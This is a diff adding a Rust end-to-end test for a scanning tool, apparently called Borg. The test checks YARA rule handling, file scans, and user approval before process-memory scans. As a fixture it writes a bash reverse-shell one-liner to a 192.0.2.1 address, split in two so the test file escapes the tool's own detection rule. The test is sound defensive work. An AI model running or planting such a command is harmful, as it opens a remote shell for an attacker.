@@ -2389,6 +2389,74 @@ fn an_agent_searches_process_memory_only_after_the_user_approves() -> Result<()>
     Ok(())
 }
 
+#[test]
+fn an_agent_scans_files_at_once_and_a_process_only_after_the_user_approves() -> Result<()> {
+    let fixture = fixture()?;
+    let rules = fixture.config().join("rules");
+    fs::create_dir_all(&rules)?;
+    fs::write(rules.join("notes.yar"), "rule notes_marker { strings: $a = \"scan-e2e-marker\" condition: $a }")?;
+    let mut app = start(&fixture, "agent-scan")?;
+    let drop = fixture.work().join("drop");
+    fs::create_dir_all(&drop)?;
+    // Put together from parts, so this file does not match Borg's rule for reverse shells.
+    fs::write(drop.join(".run.sh"), ["bash -i >& /dev", "/tcp/192.0.2.1/4444 0>&1\n"].concat())?;
+    fs::write(drop.join("notes.md"), "scan-e2e-marker")?;
+    let pid = app.process_id().context("borg's process")?;
+    let mut mcp = Mcp::start(&fixture)?;
+    mcp.request("initialize", serde_json::json!({ "protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": { "name": "test", "version": "1" } }))?;
+    let tools = mcp.request("tools/list", serde_json::json!({}))?;
+    ensure!(tools.to_string().contains("\"scan\""), "{tools}");
+    let (error, text) = mcp.call("scan", serde_json::json!({}))?;
+    ensure!(error && text.contains("needs a path"), "{text}");
+    let (error, text) = mcp.call("scan", serde_json::json!({ "path": "drop", "rules": "rule broken {" }))?;
+    ensure!(error && text.contains("rules do not compile: inline:1:"), "{text}");
+
+    let (error, text) = mcp.call("scan", serde_json::json!({ "path": "drop" }))?;
+    ensure!(!error && text.contains("2 files read") && text.contains("· finished\n"), "{text}");
+    ensure!(text.contains("1. alert · rule_match · rule reverse_shell from borg\n"), "{text}");
+    ensure!(text.contains(&format!("file: {}", drop.join(".run.sh").display())), "{text}");
+    ensure!(text.contains(&format!("rule notes_marker from {}", rules.join("notes.yar").display())), "{text}");
+    let mine =
+        serde_json::json!({ "path": "drop", "rules": "rule mine { strings: $a = \"e2e-marker\" condition: $a }" });
+    let (error, text) = mcp.call("scan", mine)?;
+    ensure!(!error && text.contains("rule mine from inline") && !text.contains("reverse_shell"), "{text}");
+
+    // The rule's own text is in Borg's memory, as the call that carries it.
+    let scan = serde_json::json!({ "pid": pid, "check": "rules", "rules": "rule seen { strings: $a = \"borg-scan-e2e-7c1\" condition: $a }" });
+    let asking = std::thread::spawn({
+        let scan = scan.clone();
+        move || {
+            let declined = mcp.call("scan", scan);
+            (mcp, declined)
+        }
+    });
+    app.wait_text("Remote wants to scan process memory")?;
+    app.wait_text(&format!("PID {pid}"))?;
+    app.wait_text("the agent's own rules, shown below")?;
+    decline(&mut app)?;
+    let (mut mcp, declined) = asking.join().unwrap();
+    let (error, text) = declined?;
+    ensure!(error && text.contains("declined"), "{text}");
+
+    let asking = std::thread::spawn(move || {
+        let found = mcp.call("scan", scan);
+        (mcp, found)
+    });
+    app.wait_text("Remote wants to scan process memory")?;
+    approve(&mut app)?;
+    let (mut mcp, found) = asking.join().unwrap();
+    let (error, text) = found?;
+    ensure!(
+        !error && text.starts_with(&format!("borg (PID {pid})\n")) && text.contains("rule seen from inline"),
+        "{text}"
+    );
+    // One approval covers searching the process too.
+    let (error, text) =
+        mcp.call("search_memory", serde_json::json!({ "pid": pid, "query": "borg-scan-e2e", "limit": 3 }))?;
+    ensure!(!error && text.contains(&format!("(PID {pid})")), "{text}");
+    Ok(())
+}
+
 /// A capture file holding one DNS question for example.com, from a documentation address to
 /// its resolver.
 fn dns_capture() -> Vec<u8> {
